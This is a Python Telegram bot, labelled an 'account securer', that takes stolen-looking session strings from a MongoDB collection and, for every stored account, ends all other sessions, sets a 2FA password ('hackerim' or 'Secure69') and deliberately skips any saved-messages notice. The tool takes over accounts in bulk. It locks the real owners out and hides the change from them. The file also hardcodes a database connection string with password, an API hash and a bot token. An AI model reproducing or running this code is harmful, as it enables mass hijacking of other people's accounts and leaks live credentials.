import logging
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from pymongo import MongoClient
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.auth import ResetAuthorizationsRequest
import os

# MongoDB configuration
MONGO_URI = "mongodb+srv://pokemon_bot_user:PokemonBot2024!Secure@cluster0pokemon-bot-clu.iveqoue.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0pokemon-bot-cluster"
DB_NAME = "pokemon_guess_bot"
ACCOUNTS_COLL = "Accounts"
API_ID = 29288199
API_HASH = "9ff308629870e029601d2ee667821506"
BOT_TOKEN = "8275817464:AAGnjwnKXvJ9NrTNE4SEnsZAHs1gm1bLDP8"

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class SecureManager:
    def __init__(self):
        self.mongo = MongoClient(MONGO_URI)
        self.db = self.mongo[DB_NAME]
        self.accounts = self.db[ACCOUNTS_COLL]
    
    def get_all_accounts(self):
        return list(self.accounts.find({}))
    
    async def secure_single_account(self, identifier, session_string):
        """Secure a single account - NO SAVED MESSAGES"""
        try:
            client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
            await client.start()
            
            if await client.is_user_authorized():
                me = await client.get_me()
                
                # Step 1: Terminate all sessions
                try:
                    await client(ResetAuthorizationsRequest())
                    sessions_terminated = True
                except Exception as e:
                    if "too new" in str(e):
                        sessions_terminated = False
                    else:
                        sessions_terminated = False
                
                # Step 2: Try hackerim first, then Secure69
                passwords_to_try = ["hackerim", "Secure69"]
                final_password = None
                
                for password in passwords_to_try:
                    try:
                        await client.edit_2fa(new_password=password)
                        final_password = password
                        result_msg = f"✅ {identifier} secured! 2FA: {password}"
                        break
                    except Exception as e:
                        if "already" in str(e).lower():
                            result_msg = f"✅ {identifier} secured! (2FA already enabled)"
                            final_password = "Unknown - Already set"
                            break
                        elif password == passwords_to_try[-1]:  # Last password failed
                            result_msg = f"✅ {identifier} secured! (2FA failed: {str(e)})"
                
                # NO SAVED MESSAGES - No confirmation sent
                
                await client.disconnect()
                return True, f"{result_msg}\nPhone: {me.phone}\nPassword: {final_password}"
            else:
                await client.disconnect()
                return False, f"❌ {identifier} - Invalid session"
                
        except Exception as e:
            return False, f"❌ {identifier} - {str(e)}"

manager = SecureManager()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("📋 List Accounts", callback_data="list")],
        [InlineKeyboardButton("🔐 Secure All Accounts", callback_data="secure_all")],
        [InlineKeyboardButton("⚡ Test Sessions", callback_data="test_sessions")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🤖 ACCOUNT SECURER BOT\n\n"
        "Secures ALL accounts by:\n"
        "🔴 Terminating all sessions\n"
        "🔐 Setting 2FA password\n"
        "🚫 No saved messages\n\n"
        "Commands:\n"
        "/accounts - Show all accounts\n"
        "/secure_all - Secure all accounts\n"
        "/test_sessions - Test session validity",
        reply_markup=reply_markup
    )

async def accounts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all accounts"""
    accounts = manager.get_all_accounts()
    
    if not accounts:
        await update.message.reply_text("❌ No accounts found")
        return
    
    response = "📋 All Accounts:\n\n"
    for i, acc in enumerate(accounts, 1):
        phone = acc.get('phone_number', 'N/A')
        status = acc.get('status', 'unknown')
        has_2fa = acc.get('has_2fa', False)
        
        response += f"{i}. `{phone}`\n"
        response += f"   Status: {status}\n"
        response += f"   2FA: {'✅' if has_2fa else '❌'}\n"
        response += "   ────────\n"
    
    if len(response) > 4096:
        for x in range(0, len(response), 4096):
            await update.message.reply_text(response[x:x+4096], parse_mode='Markdown')
    else:
        await update.message.reply_text(response, parse_mode='Markdown')

async def secure_all(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Secure ALL accounts"""
    await update.message.reply_text("🚀 SECURING ALL ACCOUNTS...\n\n🔴 Terminating sessions\n🔐 Setting 2FA: hackerim/Secure69\n🚫 No saved messages")
    
    accounts = manager.get_all_accounts()
    tasks = []
    
    # Create tasks for all accounts
    for i, acc in enumerate(accounts):
        session = acc.get('session_string')
        if session:
            identifier = f"Account_{i+1}"
            task = manager.secure_single_account(identifier, session)
            tasks.append(task)
    
    # Run all tasks in parallel
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    # Process results
    success_count = 0
    response = "📊 SECURE RESULTS:\n\n"
    
    for i, (success, message) in enumerate(results):
        if success:
            success_count += 1
            response += f"✅ {message}\n"
        else:
            response += f"❌ {message}\n"
        
        # Send batch every 8 results
        if (i + 1) % 8 == 0:
            await update.message.reply_text(response)
            response = ""
    
    if response:
        await update.message.reply_text(response)
    
    await update.message.reply_text(f"🎯 SECURE COMPLETE: {success_count}/{len(accounts)} accounts secured!")

async def test_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test session validity"""
    await update.message.reply_text("🔍 Testing session validity...")
    
    accounts = manager.get_all_accounts()
    valid_count = 0
    
    for i, acc in enumerate(accounts):
        session = acc.get('session_string')
        if session:
            try:
                client = TelegramClient(StringSession(session), API_ID, API_HASH)
                await client.start()
                
                if await client.is_user_authorized():
                    valid_count += 1
                    me = await client.get_me()
                    await update.message.reply_text(f"✅ Account_{i+1}: {me.phone} - Valid")
                else:
                    await update.message.reply_text(f"❌ Account_{i+1}: Invalid session")
                
                await client.disconnect()
            except Exception as e:
                await update.message.reply_text(f"❌ Account_{i+1}: Error - {str(e)}")
    
    await update.message.reply_text(f"📊 Session Test Complete: {valid_count}/{len(accounts)} valid")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "list":
        await accounts(query, context)
    elif query.data == "secure_all":
        await secure_all(query, context)
    elif query.data == "test_sessions":
        await test_sessions(query, context)

def main():
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("accounts", accounts))
    application.add_handler(CommandHandler("secure_all", secure_all))
    application.add_handler(CommandHandler("test_sessions", test_sessions))
    application.add_handler(CallbackQueryHandler(button_handler))
    
    logger.info("🔒 Secure Bot is running...")
    application.run_polling()

if __name__ == "__main__":
    main()
